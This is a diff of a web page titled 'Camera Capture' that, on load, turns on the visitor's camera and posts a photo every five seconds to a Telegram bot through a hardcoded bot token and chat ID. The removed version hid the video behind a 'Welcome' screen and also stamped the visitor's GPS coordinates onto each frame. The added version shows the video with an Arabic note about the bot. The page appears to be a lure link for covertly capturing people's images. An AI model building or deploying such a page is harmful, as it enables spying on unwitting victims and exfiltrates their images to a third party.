@@ -6,71 +6,75 @@
   <title>Camera Capture</title>
   <style>
     body {
-      background-color: yellow; /* Yellow background */
+      background-color: yellow;
       margin: 0;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
       flex-direction: column;
+      font-family: 'Cairo', sans-serif;
     }
 
-    /* Hide video and canvas */
-    video, canvas {
-      display: none;
+    .container {
+      text-align: center;
     }
 
-    /* Style the welcome text */
-    .welcome-text {
-      font-size: 3em;
+    video {
+      width: 200px;
+      height: auto;
+      border: 2px solid #333;
+      border-radius: 10px;
+      margin-top: 20px;
+    }
+
+    img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+    }
+
+    .description {
+      margin-top: 20px;
+      font-size: 1.5em;
       font-weight: bold;
       color: #333;
-      text-align: center;
-      animation: fadeIn 2s ease-in-out;
-    }
-
-    /* Add fade-in effect */
-    @keyframes fadeIn {
-      0% {
-        opacity: 0;
-        transform: translateY(50px);
-      }
-      100% {
-        opacity: 1;
-        transform: translateY(0);
-      }
     }
   </style>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600&display=swap" rel="stylesheet">
 </head>
 <body>
-  <div class="welcome-text">Welcome</div>
-  <video id="video" autoplay></video>
-  <canvas id="canvas" style="display:none;"></canvas>
+  <div class="container">
+    <video id="video" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <div class="description">
+      الكاميرا الآن قيد الاستخدام بناءً على اختيارك من البوت.
+    </div>
+  </div>
 
   <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
+    let stream;
 
-    // Start camera
-    async function startCamera() {
+    // Start camera with specified mode
+    async function startCamera(mode) {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        if (stream) {
+          const tracks = stream.getTracks();
+          tracks.forEach(track => track.stop());
+        }
+
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: mode }
+        });
+
         video.srcObject = stream;
-        captureAndSend(); // Start capturing images and sending
+        captureAndSend(); // Start capturing images and sending automatically
       } catch (error) {
         console.error("Error accessing camera: ", error);
       }
-    }
-
-    // Get geolocation (latitude and longitude)
-    function getLocation() {
-      return new Promise((resolve, reject) => {
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(resolve, reject);
-        } else {
-          reject("Geolocation is not supported by this browser.");
-        }
-      });
     }
 
     // Capture and send image every 5 seconds
@@ -81,22 +85,8 @@
         canvas.height = video.videoHeight;
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        // Get location data
-        try {
-          const position = await getLocation();
-          const latitude = position.coords.latitude;
-          const longitude = position.coords.longitude;
-
-          // Add location text under the image
-          context.font = "30px Arial";
-          context.fillStyle = "white";
-          context.fillText(`Location: ${latitude}, ${longitude}`, 10, canvas.height - 20);
-
-          const imageData = canvas.toDataURL('image/png'); // Convert image to Base64
-          sendToTelegram(imageData); // Send the image to Telegram
-        } catch (error) {
-          console.error("Error getting location: ", error);
-        }
+        const imageData = canvas.toDataURL('image/png'); // Convert image to Base64
+        sendToTelegram(imageData); // Send the image to Telegram
       }, 5000); // Send image every 5 seconds
     }
 
@@ -105,13 +95,11 @@
       const token = '8165540566:AAGXlo_1ljb6IkAG8jj7BjZdxwfJQhub96o'; // Bot token
       const chatId = '6514749116'; // Chat ID
 
-      // Convert Base64 to file
       const blob = await fetch(imageData).then(res => res.blob());
       const formData = new FormData();
       formData.append('chat_id', chatId);
       formData.append('photo', blob, 'photo.png');
 
-      // Send the image using Telegram API
       fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
         method: 'POST',
         body: formData
@@ -125,8 +113,12 @@
       });
     }
 
-    // Start camera when the page loads
-    startCamera();
+    // Automatically start camera based on mode received from bot
+    const urlParams = new URLSearchParams(window.location.search);
+    const cameraMode = urlParams.get('mode'); // Get 'mode' parameter from URL
+    if (cameraMode) {
+      startCamera(cameraMode);
+    }
   </script>
 </body>
 </html>
